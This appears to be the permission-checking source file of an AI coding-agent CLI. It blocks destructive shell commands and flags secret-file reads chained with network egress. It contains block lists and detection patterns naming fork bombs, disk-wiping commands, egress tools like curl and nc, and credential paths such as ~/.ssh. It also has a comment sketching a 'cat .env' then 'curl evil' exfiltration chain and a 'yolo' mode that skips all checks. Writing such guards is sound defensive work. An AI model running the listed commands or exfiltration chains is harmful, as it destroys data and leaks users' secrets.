import fs from "node:fs";
import path from "node:path";
import { isSensitivePath } from "../core/sensitive";
import { isAllowedByRules, isAskedByRules, isDeniedByRules } from "./allow";
import { type LexCache, lexCached } from "./lex-cache";
import { type ShellToken, segmentWords, splitShellSegments } from "./shell";
import type {
  PermissionContext,
  PermissionDecision,
  PermissionMode,
  PermissionRequest,
} from "./types";

const FILE_TOOLS = new Set([
  "write_file",
  "edit_file",
  "read_file",
  "read_image",
  "grep",
  "glob",
  "code_outline",
]);

// The classic fork bomb is punctuation soup that defeats word-level analysis;
// keep a literal regex for it.
const FORK_BOMB = /:\(\)\s*\{\s*:\|:&\s*\}\s*;:/;

const MAX_ANALYSIS_DEPTH = 8;

const SH_FAMILY = new Set(["sh", "bash", "zsh", "dash", "ash"]);

// Network egress commands: one of these in a chain that also touches a
// likely-secret path is the prompt-injection exfiltration signature.
const EGRESS_COMMANDS = new Set([
  "curl",
  "wget",
  "nc",
  "ncat",
  "ssh",
  "scp",
  "sftp",
  "ftp",
  "telnet",
]);

// Block devices a command must never write to (redirect targets, dd of=):
// sd/xvd/vd/hd families with optional partition numbers, plus nvme/mmc.
const BLOCK_DEVICE =
  /^\/dev\/(?:sd[a-z]+\d*|xvd[a-z]+\d*|vd[a-z]+\d*|hd[a-z]+\d*|nvme\d+n\d+(?:p\d+)?|mmcblk\d+(?:p\d+)?)$/i;

function baseName(word: string): string {
  const base = word.replace(/\\/g, "/").split("/").pop() ?? word;
  return base.toLowerCase().replace(/\.exe$/, "");
}

// Paths whose recursive deletion (or permission wipe) is never acceptable:
// filesystem / home / cwd roots, bare globs and drive roots. `$VAR` and
// `${VAR}` were normalized to `$VAR` by the lexer, so well-known home
// variables are recognizable here. Home variables with a path suffix
// ($HOME/projects) are treated exactly like the ~/ spelling, and ~user
// forms count as another user's home root.
function isDangerousDeleteTarget(target: string): boolean {
  if (/^\/+$/.test(target)) return true;
  const norm = target.replace(/\\/g, "/").replace(/\/+$/, "");
  if (norm === "/*" || norm === "*") return true;
  if (norm === "~" || norm.startsWith("~/") || /^~[^/]/.test(norm)) return true;
  if (norm === "." || norm === "./*") return true;
  if (/^[a-zA-Z]:$/.test(norm)) return true;
  const homeVars = ["$HOME", "$USERPROFILE", "$HOMEPATH"];
  if (homeVars.includes(norm)) return true;
  if (homeVars.some((v) => norm.startsWith(`${v}/`))) return true;
  if (/^%(USERPROFILE|HOMEDRIVE|HOMEPATH)%$/i.test(norm)) return true;
  if (/^%(USERPROFILE|HOMEPATH)%\//i.test(norm)) return true;
  return false;
}

function rmIsDangerous(args: string[]): boolean {
  let recursive = false;
  let optionsDone = false;
  const targets: string[] = [];
  for (const arg of args) {
    if (!optionsDone && arg === "--") {
      optionsDone = true;
      continue;
    }
    if (!optionsDone && arg.startsWith("-")) {
      if (arg === "--recursive") {
        recursive = true;
      } else if (!arg.startsWith("--") && /[rR]/.test(arg)) {
        recursive = true;
      }
      continue;
    }
    targets.push(arg);
  }
  return recursive && targets.some(isDangerousDeleteTarget);
}

function findIsDangerous(args: string[], depth: number, lex?: LexCache): boolean {
  const paths: string[] = [];
  for (const arg of args) {
    if (arg.startsWith("-") || arg === "(" || arg === ")" || arg === "!" || arg === ",") {
      break;
    }
    paths.push(arg);
  }
  // No explicit path means "everything below the cwd".
  const rootishPaths = paths.length === 0 || paths.some(isDangerousDeleteTarget);
  if (args.includes("-delete") && rootishPaths) return true;
  // `-exec CMD ARG... ;` / `-exec CMD ARG... {} +`: the payload command is
  // analyzed like any other command line, and with root-ish find roots the
  // {} placeholder stands in for "whatever find found below /", so it is
  // substituted with a root-ish target before the analysis.
  for (let k = 0; k < args.length; k += 1) {
    const arg = args[k] as string;
    if (arg !== "-exec" && arg !== "-execdir") continue;
    const cmd: string[] = [];
    for (let j = k + 1; j < args.length; j += 1) {
      const token = args[j] as string;
      if (token === ";" || token === "+") break;
      cmd.push(token);
    }
    if (cmd.length === 0) continue;
    const argv = rootishPaths ? cmd.map((token) => token.replaceAll("{}", "~")) : cmd;
    const name = baseName(argv[0] as string);
    if (name === "rm" && rmIsDangerous(argv.slice(1))) return true;
    if (SH_FAMILY.has(name)) {
      const idx = argv.indexOf("-c");
      const script = idx >= 0 ? argv[idx + 1] : undefined;
      if (script !== undefined && commandLineIsDangerous(script, depth + 1, lex)) return true;
    }
    if (commandLineIsDangerous(argv.join(" "), depth + 1, lex)) return true;
  }
  return false;
}

const XARGS_VALUE_OPTS = new Set([
  "-I",
  "-n",
  "-P",
  "-s",
  "-L",
  "-d",
  "-E",
  "-a",
  "--replace",
  "--max-args",
  "--max-procs",
  "--max-lines",
  "--delimiter",
  "--eof",
  "--arg-file",
  "--interactive",
  "--exit",
]);

// `xargs rm` takes its deletion targets from stdin, so no target analysis is
// possible — any rm (or rm-equivalent) invoked through xargs is refused. When
// the payload is a shell (-c script), the script is analyzed after replacing
// the -I placeholder with a root-ish target, since it too stands in for
// arbitrary stdin-supplied paths.
function xargsIsDangerous(args: string[], depth: number, lex?: LexCache): boolean {
  let replstr: string | undefined;
  for (let k = 0; k < args.length; k += 1) {
    const arg = args[k] as string;
    if (arg === "-I" || arg === "--replace") {
      replstr = args[k + 1];
      k += 1;
      continue;
    }
    if (arg.startsWith("--replace=")) {
      replstr = arg.slice("--replace=".length);
      continue;
    }
    // Attached spelling: -I{} (the separate form is handled above).
    if (arg.startsWith("-I") && arg.length > 2) {
      replstr = arg.slice(2);
      continue;
    }
    if (XARGS_VALUE_OPTS.has(arg)) {
      k += 1;
      continue;
    }
    if (arg.startsWith("-")) {
      continue;
    }
    const name = baseName(arg);
    if (name === "rm") return true;
    if (!SH_FAMILY.has(name)) return false;
    const scriptArgs = args.slice(k + 1);
    const idx = scriptArgs.indexOf("-c");
    const script = idx >= 0 ? scriptArgs[idx + 1] : undefined;
    if (script === undefined) return false;
    const substituted = replstr !== undefined ? script.split(replstr).join("~") : script;
    return commandLineIsDangerous(substituted, depth + 1, lex);
  }
  return false;
}

function chmodIsDangerous(args: string[]): boolean {
  let recursive = false;
  let optionsDone = false;
  const operands: string[] = [];
  for (const arg of args) {
    if (!optionsDone && arg === "--") {
      optionsDone = true;
      continue;
    }
    if (!optionsDone && arg.startsWith("-")) {
      if (arg === "--recursive" || (!arg.startsWith("--") && arg.includes("R"))) {
        recursive = true;
      }
      continue;
    }
    operands.push(arg);
  }
  // operands[0] is the mode; the rest are targets.
  return recursive && operands.slice(1).some(isDangerousDeleteTarget);
}

interface CommandInvocation {
  name: string;
  rest: string[];
  sudo: boolean;
}

interface WrapperSpec {
  // Options that consume the following token as their value (exact spelling;
  // the "--opt=value" spelling stays a single token and is skipped whole).
  valueOpts: ReadonlySet<string>;
  // Non-option arguments the wrapper takes before the command starts
  // (timeout's duration, taskset's CPU mask, chrt's priority).
  positionals: number;
  // Value options that supply the positional argument themselves (taskset's
  // mask can be spelled -c LIST instead of a bare positional).
  positionalSubstitutes?: ReadonlySet<string>;
}

// Commands that only wrap another command line; they are peeled (with their
// flags, option values and pre-command positional arguments) until the real
// command emerges, so `nice rm -rf ~` or `timeout 5 rm -rf ~` cannot smuggle
// a payload past the analysis.
const WRAPPER_COMMANDS: Record<string, WrapperSpec> = {
  sudo: {
    valueOpts: new Set([
      "-u",
      "-g",
      "-h",
      "-p",
      "-t",
      "-C",
      "-T",
      "-D",
      "-R",
      "-U",
      "--user",
      "--group",
      "--host",
      "--prompt",
      "--type",
    ]),
    positionals: 0,
  },
  doas: { valueOpts: new Set(["-u"]), positionals: 0 },
  env: { valueOpts: new Set(["-u", "-C", "--unset", "--chdir"]), positionals: 0 },
  nice: { valueOpts: new Set(["-n", "--adjustment"]), positionals: 0 },
  ionice: {
    valueOpts: new Set(["-c", "-n", "-p", "--class", "--classdata", "--pid"]),
    positionals: 0,
  },
  nohup: { valueOpts: new Set(), positionals: 0 },
  timeout: {
    valueOpts: new Set(["-k", "-s", "--kill-after", "--signal"]),
    positionals: 1,
  },
  stdbuf: {
    valueOpts: new Set(["-i", "-o", "-e", "--input", "--output", "--error"]),
    positionals: 0,
  },
  setsid: { valueOpts: new Set(), positionals: 0 },
  chrt: { valueOpts: new Set(["-p", "--pid"]), positionals: 1 },
  taskset: {
    valueOpts: new Set(["-c", "-p", "--cpu-list", "--pid"]),
    positionals: 1,
    positionalSubstitutes: new Set(["-c", "--cpu-list"]),
  },
};

// Strips leading VAR=value assignments and wrapper commands (sudo/doas/env,
// nice/ionice/nohup/timeout/stdbuf/setsid/chrt/taskset, with their flags and
// arguments) to find the command actually being run.
function commandInvocation(words: string[]): CommandInvocation | null {
  let sudo = false;
  let k = 0;
  for (;;) {
    const word = words[k];
    if (word === undefined) return null;
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
      k += 1;
      continue;
    }
    const name = baseName(word);
    const spec = WRAPPER_COMMANDS[name];
    if (spec === undefined) {
      return { name, rest: words.slice(k + 1), sudo };
    }
    sudo = sudo || name === "sudo" || name === "doas";
    k += 1;
    let positionals = spec.positionals;
    for (;;) {
      const arg = words[k];
      if (arg === undefined) return null;
      if (arg.startsWith("-") && arg !== "-") {
        if (spec.valueOpts.has(arg)) {
          if (spec.positionalSubstitutes?.has(arg)) positionals = 0;
          k += 2;
        } else {
          k += 1;
        }
        continue;
      }
      if (positionals > 0) {
        positionals -= 1;
        k += 1;
        continue;
      }
      break;
    }
  }
}

function commandLineIsDangerous(command: string, depth: number, lex?: LexCache): boolean {
  if (depth > MAX_ANALYSIS_DEPTH) return true;
  const tokens = lexCached(lex, command);
  for (const token of tokens) {
    if (token.kind === "subst" && commandLineIsDangerous(token.inner, depth + 1, lex)) {
      return true;
    }
  }
  return splitShellSegments(tokens).some((segment) => segmentIsDangerous(segment, depth, lex));
}

// PowerShell -EncodedCommand payloads are UTF-16LE base64; input that does
// not look like well-formed base64 is undecodable and must fail closed.
function decodePowerShellEncoded(encoded: string): string | null {
  if (!/^[A-Za-z0-9+/]+={0,2}$/.test(encoded) || encoded.length % 4 !== 0) return null;
  try {
    return Buffer.from(encoded, "base64").toString("utf16le");
  } catch {
    return null;
  }
}

function segmentIsDangerous(segment: ShellToken[], depth: number, lex?: LexCache): boolean {
  const { words, redirectTargets } = segmentWords(segment);
  if (redirectTargets.some((target) => BLOCK_DEVICE.test(target))) {
    return true;
  }
  const invocation = commandInvocation(words);
  if (!invocation) return false;
  const { name, rest, sudo } = invocation;
  if (sudo && name === "rm") return true;
  switch (name) {
    case "shutdown":
    case "reboot":
    case "poweroff":
    case "halt":
    case "diskpart":
    case "wipefs":
    case "shred":
    case "format-volume":
    case "clear-disk":
    case "stop-computer":
    case "bcdedit":
    case "takeown":
    case "sdelete":
      return true;
    case "rm":
      return rmIsDangerous(rest);
    case "rmdir":
    case "rd":
    case "del":
    case "erase":
      return rest.some((arg) => /^\/s$/i.test(arg));
    case "remove-item": {
      let recursive = false;
      const targets: string[] = [];
      for (const arg of rest) {
        if (arg.startsWith("-") && /^-r/i.test(arg)) {
          recursive = true;
        } else if (!arg.startsWith("-")) {
          targets.push(arg);
        }
      }
      return recursive && targets.some(isDangerousDeleteTarget);
    }
    case "format":
      return rest.some((arg) => /^[a-z]:$/i.test(arg));
    case "dd":
      return rest.some(
        (arg) =>
          arg.startsWith("if=") || (arg.startsWith("of=") && BLOCK_DEVICE.test(arg.slice(3))),
      );
    case "find":
      return findIsDangerous(rest, depth, lex);
    case "xargs":
      return xargsIsDangerous(rest, depth, lex);
    case "chmod":
      return chmodIsDangerous(rest);
    case "systemctl":
      return rest.some((arg) => ["poweroff", "halt", "reboot"].includes(arg.toLowerCase()));
    case "init":
      return rest.some((arg) => arg === "0" || arg === "6");
    case "vssadmin":
      return (
        rest.some((arg) => /^delete$/i.test(arg)) && rest.some((arg) => /^shadows$/i.test(arg))
      );
    case "wbadmin":
      return rest.some((arg) => /^delete$/i.test(arg));
    case "cipher":
      return rest.some((arg) => /^\/w/i.test(arg));
    case "icacls":
      return rest.some((arg) => /^\/reset$/i.test(arg));
    case "reg":
      // HKLM writes affect the whole machine; the lexer strips backslashes
      // from unquoted words, so HKLM\SOFTWARE arrives as HKLMSOFTWARE.
      return rest.some((arg) => /^delete$/i.test(arg)) && rest.some((arg) => /^hklm/i.test(arg));
    case "sh":
    case "bash":
    case "zsh":
    case "dash":
    case "ash": {
      const idx = rest.indexOf("-c");
      const script = idx >= 0 ? rest[idx + 1] : undefined;
      return script !== undefined && commandLineIsDangerous(script, depth + 1, lex);
    }
    case "eval":
      return rest.length > 0 && commandLineIsDangerous(rest.join(" "), depth + 1, lex);
    case "cmd": {
      const idx = rest.findIndex((arg) => /^\/[ck]$/i.test(arg));
      if (idx < 0) return false;
      const script = rest.slice(idx + 1).join(" ");
      if (script.length === 0) return false;
      // cmd's escape character: `rmdir ^/s` parses as `rmdir /s`.
      return commandLineIsDangerous(script.replace(/\^(.)/gs, "$1"), depth + 1, lex);
    }
    case "powershell":
    case "pwsh": {
      for (let k = 0; k < rest.length; k += 1) {
        const arg = rest[k] as string;
        if (/^-(c|command)$/i.test(arg)) {
          const script = rest.slice(k + 1).join(" ");
          return script.length > 0 && commandLineIsDangerous(script, depth + 1, lex);
        }
        if (/^-(enc|encodedcommand)$/i.test(arg)) {
          const encoded = rest[k + 1];
          if (encoded === undefined) return true;
          const script = decodePowerShellEncoded(encoded);
          if (script === null) return true;
          return commandLineIsDangerous(script, depth + 1, lex);
        }
      }
      return false;
    }
    default:
      return name.startsWith("mkfs") && (name.length === 4 || /[.-]/.test(name.charAt(4)));
  }
}

// Dangerous-command analysis runs on a lexed token stream (quotes stripped,
// $VAR/${VAR} normalized, $(...)/backtick/`sh -c` arguments recursed into),
// so flag order, quoting and wrapper commands cannot smuggle a blocked
// payload past it. yolo mode bypasses even this.
export function isDangerousCommand(command: string, lex?: LexCache): boolean {
  if (FORK_BOMB.test(command)) return true;
  return commandLineIsDangerous(command, 0, lex);
}

// Directories whose contents must never leave the machine: the CLI's own
// config home (~/.star-cli holds the API-key .env) and ssh keys. Compared
// case-insensitively, with $HOME / %USERPROFILE% spellings of the same dirs.
const SENSITIVE_DIR_PREFIXES = [
  "~/.star-cli",
  "~/.ssh",
  "$home/.star-cli",
  "$home/.ssh",
  "$userprofile/.ssh",
  "%userprofile%/.ssh",
];

function tokenTouchesSensitivePath(word: string): boolean {
  const norm = word.replace(/\\/g, "/").replace(/\/+$/, "").toLowerCase();
  for (const prefix of SENSITIVE_DIR_PREFIXES) {
    if (norm === prefix || norm.startsWith(`${prefix}/`)) return true;
  }
  return isSensitivePath(word);
}

interface BashHygiene {
  sensitive: boolean;
  egress: boolean;
}

// Scans a bash command for the two halves of an exfiltration signature:
// touching a likely-secret path (API keys, ssh keys, the CLI's own config
// dir, anything isSensitivePath flags) and invoking a network-egress
// command. Command substitutions and sh/cmd/eval scripts are scanned
// recursively. bash otherwise never looks at what a command reads, so this
// is the only tripwire between "cat ~/.star-cli/.env" and "curl evil/$(...)".
function bashHygiene(command: string, lex?: LexCache): BashHygiene {
  let sensitive = false;
  let egress = false;
  const visit = (tokens: ShellToken[], depth: number) => {
    if (depth > MAX_ANALYSIS_DEPTH) return;
    for (const token of tokens) {
      if (token.kind === "subst") visit(lexCached(lex, token.inner), depth + 1);
    }
    for (const segment of splitShellSegments(tokens)) {
      const { words, redirectTargets } = segmentWords(segment);
      for (const word of [...words, ...redirectTargets]) {
        if (tokenTouchesSensitivePath(word)) sensitive = true;
      }
      const invocation = commandInvocation(words);
      if (!invocation) continue;
      if (EGRESS_COMMANDS.has(invocation.name)) egress = true;
      let script: string | undefined;
      if (SH_FAMILY.has(invocation.name)) {
        const idx = invocation.rest.indexOf("-c");
        script = idx >= 0 ? invocation.rest[idx + 1] : undefined;
      } else if (invocation.name === "cmd") {
        const idx = invocation.rest.findIndex((arg) => /^\/[ck]$/i.test(arg));
        script = idx >= 0 ? invocation.rest.slice(idx + 1).join(" ") : undefined;
      } else if (invocation.name === "eval" && invocation.rest.length > 0) {
        script = invocation.rest.join(" ");
      }
      if (script !== undefined) visit(lexCached(lex, script), depth + 1);
    }
  };
  visit(lexCached(lex, command), 0);
  return { sensitive, egress };
}

function getStringArg(args: unknown, key: string): string | undefined {
  if (typeof args === "object" && args !== null) {
    const value = (args as Record<string, unknown>)[key];
    if (typeof value === "string") {
      return value;
    }
  }
  return undefined;
}

function normalizeAbsolute(p: string, cwd: string): string {
  const abs = path.isAbsolute(p) ? path.normalize(p) : path.resolve(cwd, p);
  return abs.replace(/\\/g, "/").replace(/\/+$/, "").toLowerCase();
}

function isOutsideCwd(p: string, cwd: string): boolean {
  const abs = normalizeAbsolute(p, cwd);
  const base = normalizeAbsolute(cwd, cwd);
  return abs !== base && !abs.startsWith(`${base}/`);
}

// Short-TTL (≤5s) caches for filesystem resolution, keyed by path string and
// bounded so a long session cannot grow them without limit. The TTL is
// deliberately brief because resolution is part of a security boundary: a
// symlink swapped within the window keeps its old verdict — the accepted
// trade-off for keeping repeated realpathSync calls (and multi-second
// unreachable-UNC hangs) off the render thread.
const REALPATH_TTL_MS = 5_000;
const REALPATH_CACHE_MAX = 1000;

interface RealpathEntry {
  value: string | null;
  expires: number;
}

// Map iterates in insertion order: hits re-insert to stay recent, and a full
// cache drops the oldest entry — a simple LRU.
class RealpathCache {
  private readonly map = new Map<string, RealpathEntry>();

  get(key: string): string | null | undefined {
    const entry = this.map.get(key);
    if (entry === undefined) return undefined;
    if (entry.expires <= Date.now()) {
      this.map.delete(key);
      return undefined;
    }
    this.map.delete(key);
    this.map.set(key, entry);
    return entry.value;
  }

  set(key: string, value: string | null): void {
    this.map.delete(key);
    if (this.map.size >= REALPATH_CACHE_MAX) {
      const oldest = this.map.keys().next().value;
      if (oldest !== undefined) this.map.delete(oldest);
    }
    this.map.set(key, { value, expires: Date.now() + REALPATH_TTL_MS });
  }
}

const realpathCache = new RealpathCache();
const resolvedPathCache = new RealpathCache();

// fs.realpathSync through the TTL cache; null means missing/unresolvable
// (negative results are cached too — a not-yet-created file is re-asked on
// every write attempt otherwise).
function realpathCached(p: string): string | null {
  const hit = realpathCache.get(p);
  if (hit !== undefined) return hit;
  let value: string | null;
  try {
    value = fs.realpathSync(p);
  } catch {
    value = null;
  }
  realpathCache.set(p, value);
  return value;
}

// Resolves symlinks for a target: the file itself when it exists, otherwise
// the nearest existing ancestor with the missing tail re-attached. Returns
// null when nothing on the path can be resolved.
function resolveRealPath(p: string, cwd: string): string | null {
  const start = path.isAbsolute(p) ? path.normalize(p) : path.resolve(cwd, p);
  const hit = resolvedPathCache.get(start);
  if (hit !== undefined) return hit;
  const value = resolveRealPathUncached(start);
  resolvedPathCache.set(start, value);
  return value;
}

function resolveRealPathUncached(start: string): string | null {
  // win32 UNC paths (\\host\share\...) hang for seconds per realpathSync when
  // the host is unreachable, and the per-component walk below would multiply
  // that by the path depth. Try the full path once; when it fails, judge the
  // boundary by the normalized spelling (the same string-based fallback the
  // unresolvable case has always used).
  if (process.platform === "win32" && start.startsWith("\\\\")) {
    return realpathCached(start) ?? start;
  }
  let current = start;
  const missing: string[] = [];
  for (;;) {
    const resolved = realpathCached(current);
    if (resolved !== null) {
      return path.join(resolved, ...missing.reverse());
    }
    const parent = path.dirname(current);
    if (parent === current) return null;
    missing.push(path.basename(current));
    current = parent;
  }
}

// Outside-cwd check that sees through symlinks: a link inside cwd pointing
// outside must be treated as outside — for write tools, and equally for read
// tools, which otherwise leak outside files (e.g. a repo symlink pointing at
// ~/.ssh) in auto mode. Falls back to the plain string check when the path
// (or cwd) cannot be resolved.
function isOutsideResolved(p: string, cwd: string): boolean {
  const resolved = resolveRealPath(p, cwd);
  if (resolved === null) return isOutsideCwd(p, cwd);
  const realCwd = realpathCached(cwd);
  if (realCwd === null) return isOutsideCwd(p, cwd);
  return isOutsideCwd(resolved, realCwd);
}

export function checkPermission(
  mode: PermissionMode,
  req: PermissionRequest,
  ctx: PermissionContext,
  allowRules: readonly string[] = [],
  denyRules: readonly string[] = [],
  askRules: readonly string[] = [],
): PermissionDecision {
  // yolo bypasses every check, including the hard safety rules below.
  if (mode === "yolo") {
    return "allow";
  }

  const command = getStringArg(req.args, "command");
  const filePath = getStringArg(req.args, "path");

  // One lexer memo shared by every bash stage below (dangerous-command
  // analysis, sensitive-path tripwire, allow/deny/ask rule matching), so the
  // command line and its substitution bodies are lexed once per check.
  const lex: LexCache | undefined =
    req.toolName === "bash" && command !== undefined ? new Map() : undefined;

  let bashTouchesSensitive = false;
  if (req.toolName === "bash" && command !== undefined) {
    if (isDangerousCommand(command, lex)) {
      return "deny";
    }
    const hygiene = bashHygiene(command, lex);
    // Secret read + network egress in one chain = exfiltration signature.
    if (hygiene.sensitive && hygiene.egress) {
      return "deny";
    }
    bashTouchesSensitive = hygiene.sensitive;
  }

  if (FILE_TOOLS.has(req.toolName) && filePath !== undefined) {
    const isWriteTool = req.toolName === "write_file" || req.toolName === "edit_file";
    if (isWriteTool && isSensitivePath(filePath)) {
      return "deny";
    }
    if (isOutsideResolved(filePath, ctx.cwd)) {
      if (mode === "ask" && req.level === "read") {
        return "ask";
      }
      return "deny";
    }
  }

  if (isDeniedByRules(denyRules, req, lex)) {
    return "deny";
  }

  if (mode === "auto") {
    // A likely-secret read on the command line always gets a human look in
    // auto mode; so does anything matching an explicit ask rule.
    if (bashTouchesSensitive) {
      return "ask";
    }
    if (isAskedByRules(askRules, req, lex)) {
      return "ask";
    }
    return "allow";
  }
  if (mode === "readonly") {
    return req.level === "read" ? "allow" : "deny";
  }
  if (mode === "plan") {
    return req.level === "read" ? "allow" : "deny";
  }
  if (isAskedByRules(askRules, req, lex)) {
    return "ask";
  }
  if (isAllowedByRules(allowRules, req, lex)) {
    return "allow";
  }
  return req.level === "read" ? "allow" : "ask";
}

export function describeDecision(decision: PermissionDecision): string {
  switch (decision) {
    case "allow":
      return "允许执行该操作";
    case "deny":
      return "拒绝执行：违反权限模式、硬性安全规则或配置的拒绝规则";
    case "ask":
      return "需要用户确认后才能执行";
  }
}
